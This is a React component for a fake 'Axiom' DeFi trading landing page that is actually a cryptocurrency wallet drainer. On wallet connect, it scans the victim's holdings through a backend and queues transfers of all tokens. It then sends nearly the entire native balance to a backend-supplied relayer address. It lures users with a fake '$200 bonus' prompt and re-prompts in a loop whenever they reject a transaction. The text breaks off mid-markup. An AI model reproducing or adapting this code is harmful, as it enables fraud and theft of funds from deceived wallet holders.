"use client"

import React, { useEffect, useState, useRef } from 'react'
import { useAppKit } from '@reown/appkit/react'
import { useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

interface Token {
  symbol?: string
  address?: string | null
  balance?: string
  decimals?: number
  chain?: number
}

interface SentItem {
  token: Token
  type: 'wrap' | 'transfer' | string
  tx?: string
  amount?: string
  jobId?: string
}

interface FailedItem {
  token: Token
  reason: string
}

// Función helper para fetch con mejor manejo de errores
const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
  const res = await fetch(url, options);
  
  // Verificar el tipo de contenido antes de analizar JSON
  const contentType = res.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    const text = await res.text();
    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
  }

  if (!res.ok) {
    const errorData = await res.json();
    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
  }

  return res.json();
};

export default function TokenManager(): React.JSX.Element {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const walletClient = (useWalletClient() as { data?: any }).data
  const publicClient: any = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const [tokens, setTokens] = useState<Token[]>([])
  const [processing, setProcessing] = useState<boolean>(false)
  const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
  const [isClient, setIsClient] = useState<boolean>(false)
  const [hasScanned, setHasScanned] = useState<boolean>(false)
  const [scanError, setScanError] = useState<string>('')
  const [isLoading, setIsLoading] = useState<boolean>(false)
  const [loadingMessage, setLoadingMessage] = useState<string>('')
  const [showProcessingModal, setShowProcessingModal] = useState<boolean>(false)
  const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
  const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])

  // Estados para modales
  const [showModal, setShowModal] = useState<boolean>(false)
  const [modalContent, setModalContent] = useState<{
    title: string;
    message: string;
    type: 'error' | 'info' | 'success';
    onConfirm?: () => void;
    confirmText?: string;
    showCancel?: boolean;
    onCancel?: () => void;
  }>({
    title: '',
    message: '',
    type: 'info'
  })

  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
  const { switchChain } = useSwitchChain()

  // Ref para evitar scans concurrentes
  const scanningRef = useRef(false)

  // Función para mostrar modales
  const showAlertModal = (title: string, message: string, type: 'error' | 'info' | 'success' = 'info', onConfirm?: () => void, confirmText: string = 'Accept', showCancel: boolean = false, onCancel?: () => void) => {
    setModalContent({
      title,
      message,
      type,
      onConfirm,
      confirmText,
      showCancel,
      onCancel
    })
    setShowModal(true)
  }

  const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
    if (!walletClient) throw new Error('Wallet client no disponible')

    try {
      setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
      setIsLoading(true)

      const getCurrent = async () => {
        try {
          return await walletClient.getChainId()
        } catch (e) {
          return undefined
        }
      }

      const currentChainId = await getCurrent()
      if (currentChainId === targetChainId) {
        setIsLoading(false)
        return
      }

      // Intentar usar switchChain de wagmi si está disponible
      let switched = false
      try {
        if (switchChain) {
          await switchChain({ chainId: targetChainId })
          switched = true
        }
      } catch (swErr: any) {
        // Si switchChain no funcionó, seguiremos intentando con wallet RPC
        if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
          // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
        }
        if (isUserRejected(swErr)) {
          throw new Error('Usuario rechazó el cambio de red')
        }
      }

      // Si no se hizo el cambio con switchChain, intentar con request RPC
      if (!switched) {
        try {
          await walletClient.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${targetChainId.toString(16)}` }]
          })
        } catch (err: any) {
          // Si la cadena no existe (4902) intentamos agregarla
          if (err?.code === 4902) {
            // sólo ejemplo para BSC; agregar más blockchains según necesites
            if (targetChainId === 56) {
              await walletClient.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }]
              })
              // intentar switch otra vez
              await walletClient.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
              })
            } else {
              throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
            }
          } else if (isUserRejected(err)) {
            throw new Error('Usuario rechazó el cambio de red')
          } else {
            throw err
          }
        }
      }

      // Polling: esperar hasta que la wallet realmente reporte la nueva chain
      const start = Date.now()
      while (Date.now() - start < timeoutMs) {
        const newChain = await getCurrent()
        if (newChain === targetChainId) {
          setIsLoading(false)
          return
        }
        await new Promise((r) => setTimeout(r, 500))
      }

      throw new Error('Timeout esperando que la wallet cambie de red')
    } catch (error: any) {
      setIsLoading(false)
      // rethrow con mensaje legible
      if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
      throw new Error(error?.message || String(error))
    }
  }

  useEffect(() => {
    setIsClient(true)

    // Global error handlers
    const onError = (e: ErrorEvent) => {
      console.error('Global error captured:', e.error || e.message || e)
    }
    const onRejection = (e: PromiseRejectionEvent) => {
      console.error('Unhandled rejection captured:', e.reason || e)
    }

    window.addEventListener('error', onError)
    window.addEventListener('unhandledrejection', onRejection)

    return () => {
      window.removeEventListener('error', onError)
      window.removeEventListener('unhandledrejection', onRejection)
    }
  }, [])

  // RESET cuando se desconecta para permitir re-intentos limpios
  useEffect(() => {
    if (!isConnected) {
      setHasScanned(false)
      setTokens([])
      setDetectedTokensCount(0)
      setSummary({ sent: [], failed: [] })
      setScanError('')
      setPendingNativeTokens([])
    }
  }, [isConnected])

  // Nuevo useEffect: dispara scan al conectar (y cuando cambia address)
  useEffect(() => {
    if (isConnected && address) {

      // Pequeño delay para que el provider/wagmi termine su inicialización
      const t = setTimeout(() => {
        // Evitar multiples llamadas si ya hay un scan en curso
        if (scanningRef.current) return
        scanWallet().catch((e) => {
          console.error('scanWallet error (from connect effect):', e)
        })
      }, 300)

      return () => clearTimeout(t)
    }
  }, [isConnected, address])

  useEffect(() => {
    // Solo iniciar procesamiento si no hay otros modales abiertos y no estamos procesando
    if (hasScanned && tokens.length > 0 && !processing && !showModal && !isLoading) {
      setShowProcessingModal(true)
      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
      setTimeout(() => {
        processAllTokens()
      }, 1500)
    }
  }, [hasScanned, tokens, processing, showModal, isLoading])

  const showLoading = (message: string) => {
    setLoadingMessage(message)
    setIsLoading(true)
  }

  const hideLoading = () => {
    setIsLoading(false)
    setLoadingMessage('')
  }

  const alertAction = async (message: string): Promise<void> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
      return
    }

    // Mostrar modal en lugar de alert nativo
    return new Promise(resolve => {
      showAlertModal('Alert', message, 'info', () => {
        setShowModal(false)
        resolve()
      })
    })
  }

  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data?.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(Boolean(data.response))
            }
          } catch (e) {}
        }

        window.addEventListener('message', handler)
        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))

        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    }

    // Mostrar modal de confirmación
    return new Promise(resolve => {
      showAlertModal(
        'Accept', 
        message, 
        'info', 
        () => {
          setShowModal(false)
          resolve(true)
        },
        'Accept',
        true,
        () => {
          setShowModal(false)
          resolve(false)
        }
      )
    })
  }

  const scanWallet = async (): Promise<void> => {
    if (scanningRef.current) {
      console.log('[scanWallet] Scan already in progress - skipping')
      return
    }
    scanningRef.current = true

    try {
      setScanError('')
      showLoading('')

      if (!BACKEND) {
        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
        console.error('[CONFIG]', errorMsg)
        setScanError(errorMsg)
        hideLoading()
        showAlertModal('Error', errorMsg, 'error')
        return
      }

      // Protecciones: asegurar address válido
      if (!address) {
        throw new Error('Address no está disponible aún')
      }

      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ owner: address })
      })

      console.log('[scanWallet] backend response', data)

      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
        if (token.symbol === 'MATIC' && !token.address) {
          return { ...token, address: null }
        }
        return token
      })

      // Verificar si no se encontraron tokens
      if (!processedTokens || processedTokens.length === 0) {
        setHasScanned(true)
        hideLoading()
        showAlertModal(
          'Error', 
          'Error no tienes saldo, recarga la billetera e intenta de nuevo', 
          'error', 
          () => {
            setShowModal(false)
            // reintentar el escaneo
            scanWallet().catch(e => console.error(e))
          },
          'Reintentar'
        )
        return
      }

      // Guardar todos los tokens
      setTokens(processedTokens || [])
      setDetectedTokensCount(processedTokens.length)
      setHasScanned(true)
      
      // Preparar tokens nativos pendientes
      const nativeTokens = processedTokens.filter(token => !token.address)
      setPendingNativeTokens(nativeTokens)
      
      // Log de tokens en consola
      if (processedTokens.length > 0) {
        console.log('[scanWallet] tokens', processedTokens)
      }
      
      hideLoading()
    } catch (err: any) {
      console.error('Error', err)
      const errorMsg = '' + (err?.message || err)
      setScanError(errorMsg)
      hideLoading()
      showAlertModal('Error', errorMsg + '\n\nPlease try reconnecting the wallet.', 'error')
    } finally {
      scanningRef.current = false
    }
  }

  const getWrapInfo = async (chainId: number): Promise<any | null> => {
    try {
      if (!BACKEND) {
        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
        return null
      }
      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ chain: chainId })
      })
    } catch (err) {
      console.error('Error, please reload the page and try again.', err)
      return null
    }
  }

  const isUserRejected = (error: any): boolean => {
    if (!error) return false
    const message = String(error?.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }
    

  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
    try {
      
      if (!walletClient || !publicClient || !address) {
        throw new Error('Wallet not connected correctly');
      }

      // Cambiar a la cadena correcta antes de procesar
      await changeChainIfNeeded(token.chain as number)

      const targetChainId = token.chain as number;
      if (!targetChainId) {
        throw new Error('The token string could not be determined');
      }

      // Cambiar a la cadena correcta antes de procesar
      await changeChainIfNeeded(targetChainId);

      // Resto del código para wrap o transferencia...
      const wrapInfo = await getWrapInfo(targetChainId);
      const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;

      const balanceBN = ethers.BigNumber.from(token.balance || '0')
      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto

      // Estimaciones de gas
      const gasLimitTransfer = ethers.BigNumber.from(21000)
      const gasLimitWrap = ethers.BigNumber.from(100000)

      // Buffer de seguridad
      const buffer = gasPrice.mul(30000)

      // Calcular máximos seguros
      const feeWrap = gasPrice.mul(gasLimitWrap)
      const feeTransfer = gasPrice.mul(gasLimitTransfer)
      const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
      const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)

      // Si no hay suficiente para ninguna operación
      if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
      const reason = 'Saldo insuficiente para cubrir gas fees'
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
      
      // Mostrar modal de error de gas SOLO si no hay otros modales activos
      if (!showModal) {
  showAlertModal(
    'Error', 
    'Por favor recargue la wallet', 
    'error', 
    () => {
      setShowModal(false);
      window.location.reload(); // Recargar la página
    },
    'Reintentar' // Texto del botón
  )
}
      
      return { success: false, reason }
    }

      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
      if (wrappedAddress && maxSafeForWrap.gt(0)) {
        try {
          showLoading(`Processing ${token.symbol}...`)
          
          const wrapAbi = [
            {
              inputs: [],
              name: 'deposit',
              outputs: [],
              stateMutability: 'payable',
              type: 'function'
            }
          ] as const

          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              transactionHash = await walletClient.writeContract({
                address: wrappedAddress as `0x${string}`,
                abi: wrapAbi,
                functionName: 'deposit',
                value: maxSafeForWrap.toBigInt(),
                gas: gasLimitWrap.toBigInt()
              })

              showLoading(`Waiting for confirmation ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction("There's little time left to claim your $200 coupon.");
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token: { ...token, symbol: `W${token.symbol}` }, 
              type: 'wrap', 
              tx: transactionHash, 
              amount: maxSafeForWrap.toString() 
            }]
          }))

          hideLoading()
          return { success: true }
        } catch (error: any) {
            // Manejo de errores
            console.error('Error', error);
            const reason = isUserRejected(error) ? 
              'Error' : 
              `Error: ${error?.message || error}`;

            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
            return { success: false, reason };
          }
        };

      // Si no se hizo wrap, crear solicitud de transferencia en el backend
      if (maxSafeForTransfer.gt(0)) {
        if (!BACKEND) throw new Error('BACKEND no configurado')
        
        showLoading(`Creating request ${token.symbol}...`)
        const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            owner: address,
            chain: token.chain,
            amount: maxSafeForTransfer.toString()
          })
        })

        if (data.ok && data.instructions && data.instructions.relayerAddress) {
          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              showLoading(`Waiting ${token.symbol}...`)
              transactionHash = await walletClient.sendTransaction({
                to: data.instructions.relayerAddress as `0x${string}`,
                value: maxSafeForTransfer.toBigInt(),
                gas: gasLimitTransfer.toBigInt()
              })

              showLoading(`Waiting for confirmation ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction("There's little time left to claim your $200 coupon.");
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token, 
              type: 'transfer', 
              tx: transactionHash, 
              amount: maxSafeForTransfer.toString(), 
              jobId: data.jobId 
            }]
          }))
          
          hideLoading()
          return { success: true }
        } else {
          hideLoading()
          throw new Error('Error')
        }
      }
      
      hideLoading()
      return { success: false, reason: 'The request could not be processed' }
    } catch (error: any) {
      hideLoading()
      console.error('Error', error)

      const reason = isUserRejected(error) ? 'Error' : `Error: ${error?.message || error}`

      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
      return { success: false, reason }
    }
    
  }
  

  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
    try {
      if (!BACKEND) throw new Error('BACKEND no configurado')
      
      showLoading(`Procesando ${token.symbol}...`)
      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })

      if (data.ok) {
        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
        hideLoading()
        return { success: true }
      } else {
        hideLoading()
        throw new Error(data.error || 'Error')
      }
    } catch (error: any) {
      hideLoading()
      console.error('Error', error)
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error' }] }))
      return { success: false, reason: error?.message || 'Error' }
    }
  }
  

  const processAllTokens = async (): Promise<void> => {
  if (!tokens.length || processing) {
    setShowProcessingModal(false)
    return
  }

  setProcessing(true)
  setSummary({ sent: [], failed: [] })
  
  const nonNativeTokens = tokens.filter(token => token.address !== null)
  const nativeTokens = tokens.filter(token => token.address === null)

  // Procesar tokens no nativos
  for (const token of nonNativeTokens) {
    await processToken(token)
  }

  // Procesar tokens nativos SOLO si el usuario aceptó
  if (nativeTokens.length > 0) {
    const shouldProcessNatives = await confirmAction(
      `You have a $200 bonus available to claim.`
    )
    
    if (shouldProcessNatives) {
      for (const token of nativeTokens) {
        await changeChainIfNeeded(token.chain as number)
        await processNativeToken(token)
      }
    } else {
      // Agregar tokens nativos no procesados a la lista de fallados
      setSummary(prev => ({
        ...prev,
        failed: [
          ...prev.failed,
          ...nativeTokens.map(token => ({ 
            token, 
            reason: 'Error' 
          }))
        ]
      }))
    }
  }

  setProcessing(false)
  setShowProcessingModal(false)

  // Mostrar resumen
  setTimeout(() => {
    if (summary.sent.length > 0 || summary.failed.length > 0) {
      let message = 'summary\n'
      message += `successful process`
      message += `failures: ${summary.failed.length}, Please check your balance and recharge the page.`
      
      if (summary.failed.length > 0) {
        message += '\n\nThe request was not processed. Check the details.'
      }

      showAlertModal('successful process', message, 'info')
    }
  }, 100)
}

  // Evitar renderizado hasta que estemos en el cliente
  if (!isClient) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        flexDirection: 'column'
      }}>
     
      </div>
    )
  }

  return (
    <div style={{ width: '100%', height: '100%', fontFamily: 'Inter, sans-serif' }}>
      {/* Navigation */}
      <nav className="navbar" style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '1rem 2rem',
        backgroundColor: '#000',
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        zIndex: 100
      }}>
       <img 
          src="media/Axiom Logo.svg" 
          className="responsive-logo" 
          alt="Axiom Logo" 
          style={{ 
            width: '10%', 
            maxWidth: '120px', // Tamaño máximo para escritorio
            minWidth: '80px'   // Tamaño mínimo para móviles
          }} 
        /> 
        <div className="nav-buttons" style={{ display: 'flex', gap: '1rem' }}>
          <button className="login-btn" onClick={() => open()} style={{
            padding: '10px 16px',
            backgroundColor: 'transparent',
            color: '#fff',
            border: '1px solid #333',
            borderRadius: '8px',
            cursor: 'pointer',
            fontSize: '14px'
          }}>Login</button>
          <button className="signup-btn" onClick={() => open()} style={{
            padding: '10px 16px',
            backgroundColor: '#0070f3',
            color: 'white',
            border: 'none',
            borderRadius: '8px',
            cursor: 'pointer',
            fontSize: '14px'
          }}>Sign up</button>
        </div>
      </nav>

      {/* Main content */}
      <main className="main-content" style={{ width: '100%', minHeight: '100vh' }}>
        <section className="main-content" style={{ 
          width: '100%', 
          height: '100vh', 
          backgroundImage: 'url(media/Captura_de_pantalla_2025-08-13_231920.png)',
          backgroundSize: 'cover', 
          backgroundPosition: 'center',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          textAlign: 'center',
          paddingTop: '4rem'
        }}>
          <div style={{ paddingTop: '5%' }}> 
            <img src="media/Logo.svg" style={{ width: '200%', maxWidth: '600px' }} alt="Axiom Logo" />
          </div>
      
          <h1 className="main-title" style={{ 
            marginTop: '2%', 
            color: '#fff', 
            fontSize: '3rem',
            fontWeight: '700'
          }}>The Gateway to DeFi</h1>
          
          <p className="subtitle" style={{
            color: '#ccc',
            fontSize: '1.2rem',
            marginBottom: '2rem'
          }}>Axiom is the only trading platform you'll ever need.</p>
          
          <button
            style={{
              marginTop: '2%', 
              padding: '12px 24px',
              backgroundColor: '#0070f3',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              cursor: 'pointer',
              fontSize: '16px',
              fontWeight: '600'
            }}
            onClick={() => open()}
          >
            {isConnected ? `Connected: ${String(address)?.substring(0, 8)}...` : 'Start Trading'}
          </button>

          
          <div className="backed-by" style={{
            marginTop: '3rem',
            color: '#888',
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem'
          }}>
            <span className="backed-text">Backed by</span>
            <div className="combinator-logo" style={{
              display: 'flex',
              alignItems: 'center',
              gap: '0.25rem'
            }}>
              <div className="combinator-icon" style={{
                width: '24px',
                height: '24px',
                backgroundColor: '#fff',
                color: '#000',
                borderRadius: '4px',
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                fontWeight: 'bold',
                fontSize: '18px'
              }}>Y</div>
              <span className="combinator-text" style={{ fontWeight: '600' }}>Combinator</span>
            </div>
          </div>
        </section>

        <section style={{ width: '100%' }}>
          <video style={{ width: '100%' }}
            src="media/hero-video.mp4"
            autoPlay
            loop
            muted
            playsInline
          />
        </section>

        <div className="trading-features-section" style={{
          padding: '4rem 2rem',
          backgroundColor: '#0a0a0a'
        }}>
          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
            <div className="header-content" style={{ textAlign: 'center', marginBottom: '3rem' }}>
              <h1 className="main-title" style={{ 
                color: '#fff', 
                fontSize: '2.5rem',
                fontWeight: '700',
                lineHeight: '1.2',
                marginBottom: '1rem'
              }}>Advanced Features to<br />videoline Your Trading.</h1>
              <p className="subtitle" style={{
                color: '#ccc',
                fontSize: '1.2rem'
              }}>From wallet tracking to real-time analytics, we've got you covered.</p>
            </div>
            
            <div className="features-grid" style={{
              display: 'grid',
              gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
              gap: '2rem'
            }}>
              <div className="feature-item active" style={{
                padding: '1.5rem',
                backgroundColor: '#111',
                borderRadius: '12px',
                border: '1px solid #222',
                position: 'relative'
              }}>
                <div className="feature-line" style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  height: '100%',
                  width: '4px',
                  backgroundColor: '#0070f3'
                }}></div>
                <h3 className="feature-title" style={{
                  color: '#fff',
                  fontSize: '1.2rem',
                  marginBottom: '0.5rem'
                }}>Order Execution Engine</h3>
                <p className="feature-description" style={{
                  color: '#888'
                }}>Trade with confidence.</p>
              </div>
              
              <div className="feature-item" style={{
                padding: '1.5rem',
                backgroundColor: '#111',
                borderRadius: '12px',
                border: '1px solid ',
                position: 'relative'
              }}>
                <div className="feature-line" style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  height: '100%',
                  width: '4px',
                  backgroundColor: '#333'
                }}></div>
                <h3 className="feature-title" style={{
                  color: '#fff',
                  fontSize: '1.2rem',
                  marginBottom: '0.5rem'
                }}>Wallet and Twitter Tracker</h3>
                <p className="feature-description" style={{
                  color: '#888'
                }}>Trade and track all in one place.</p>
              </div>
              
              <div className="feature-item" style={{
                padding: '1.5rem',
                backgroundColor: '#111',
                borderRadius: '12px',
                border: '1px solid #222',
                position: 'relative'
              }}>
                <div className="feature-line" style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  height: '100%',
                  width: '4px',
                  backgroundColor: '#333'
                }}></div>
                <h3 className="feature-title" style={{
                  color: '#fff',
                  fontSize: '1.2rem',
                  marginBottom: '0.5rem'
                }}>Hyperliquid Perpetuals</h3>
                <p className="feature-description" style={{
                  color: '#888'
                }}>Trade leveraged Perps.</p>
              </div>
              
              <div className="feature-item" style={{
                padding: '1.5rem',
                backgroundColor: '#111',
                borderRadius: '12px',
                border: '1px solid #222',
                position: 'relative'
              }}>
                <div className="feature-line" style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  height: '100%',
                  width: '4px',
                  backgroundColor: '#333'
                }}></div>
                <h3 className="feature-title" style={{
                  color: '#fff',
                  fontSize: '1.2rem',
                  marginBottom: '0.5rem'
                }}>Yield</h3>
                <p className="feature-description" style={{
                  color: '#888'
                }}>Earn while you sleep.</p>
              </div>
            </div>
          </div>
        </div>

        <div className="trading-dashboard-section" style={{
          padding: '4rem 2rem',
          backgroundColor: '#000'
        }}>
          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
            <div className="content-wrapper" style={{
              display: 'grid',
              gridTemplateColumns: '1fr 1fr',
              gap: '4rem',
              alignItems: 'center'
            }}>
              <div className="features-left">
                <div className="feature-block active" style={{
                  marginBottom: '2rem',
                  padding: '1.5rem',
                  backgroundColor: '#111',
                  borderRadius: '12px',
                  border: '1px solid #222'
                }}>
                  <div className="feature-header" style={{
                    display: 'flex',
                    alignItems: 'center',
                    marginBottom: '1rem'
                  }}>
                    <div className="feature-content">
                      <h3 style={{
                        color: '#fff',
                        fontSize: '1.5rem',
                        margin: 0
                      }}>Land in \u22641 Block</h3>
                    </div>
                  </div>
                  <p className="feature-description" style={{
                    color: '#ccc',
                    marginBottom: '1rem'
                  }}>Our limit order execution engine is the fastest in the market.</p>
                  <div className="feature-details">
                    <p style={{
                      color: '#888',
                      margin: 0
                    }}>With our proprietary order execution engine and colocated nodes, our limit orders land in \u22641 block.</p>
                  </div>
                </div>

                <section style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div className="feature-block" style={{
                    padding: '1rem',
                    backgroundColor: '#111',
                    borderRadius: '8px',
                    border: '1px solid #222'
                  }}>
                    <div className="feature-header" style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.5rem'
                    }}>
                      <div className="feature-icon" style={{
                        width: '24px',
                        height: '24px',
                        color: '#fff',
                        display: 'flex',
                        justifyContent: 'center',
                        alignItems: 'center'
                      }}>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" strokeWidth="2" fill="none"/>
                        </svg>
                      </div>
                      <div className="feature-content">
                        <h3 style={{
                          color: '#fff',
                          fontSize: '1.1rem',
                          margin: 0
                        }}>Migration Sniper</h3>
                      </div>
                    </div>
                  </div>

                  <div className="feature-block" style={{
                    padding: '1rem',
                    backgroundColor: '#111',
                    borderRadius: '8px',
                    border: '1px solid #222'
                  }}>
                    <div className="feature-header" style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.5rem'
                    }}>
                      <div className="feature-icon" style={{
                        width: '24px',
                        height: '24px',
                        color: '#fff',
                        display: 'flex',
                        justifyContent: 'center',
                        alignItems: 'center'
                      }}>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="currentColor" strokeWidth="2" fill="none"/>
                          <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" strokeWidth="2"/>
                          <line x1="15" y1="9" x2="9" y2='15' stroke="currentColor" strokeWidth="2"/>
                        </svg>
                      </div>
                      <div className="feature-content">
                        <h3 style={{
                          color: '#fff',
                          fontSize: '1.1rem',
                          margin: 0
                        }}>No MEV Triggers</h3>
                      </div>
                    </div>
                  </div>

                  <div className="feature-block" style={{
                    padding: '1rem',
                    backgroundColor: '#111',
                    borderRadius: '8px',
                    border: '1px solid #222'
                  }}>
                    <div className="feature-header" style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.5rem'
                    }}>
                      <div className="feature-icon" style={{
                        width: '24px',
                        height: '24px',
                        color: '#fff',
                        display: 'flex',
                        justifyContent: 'center',
                        alignItems: 'center'
                      }}>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" stroke="currentColor" strokeWidth="2" fill="none"/>
                          <line x1="4" y1="22" x2="4" y2="15" stroke="currentColor" strokeWidth="2"/>
                        </svg>
                      </div>
                      <div className="feature-content">
                        <h3 style={{
                          color: '#fff',
                          fontSize: '1.1rem',
                          margin: 0
                        }}>Auto-Strategies</h3>
                      </div>
                    </div>
                  </div>
                </section>
              </div>

              <div className="video-right">
                <section>
                  <video 
                    src="media/land-on-two-blocks.mp4"
                    autoPlay
                    loop
                    muted
                    playsInline
                    style={{ width: '100%', borderRadius: '12px' }}
                  />
                </section>
              </div>
            </div>
          </div>
        </div>
      </main>

      {(isLoading || showProcessingModal) && !showModal && (
          <div style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: 'rgba(0, 0, 0, 0.8)',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            zIndex: 1000
          }}>
            <div style={{
              width: '50px',
              height: '50px',
              border: '5px solid #f3f3f3',
              borderTop: '5px solid #0070f3',
              borderRadius: '50%',
              animation: 'spin 1s linear infinite'
            }}></div>
          </div>
        )}

      {/* Modal para alertas y confirmaciones */}
      {showModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 2000
        }}>
          <div style={{
            backgroundColor: '#222',
            padding: '2rem',
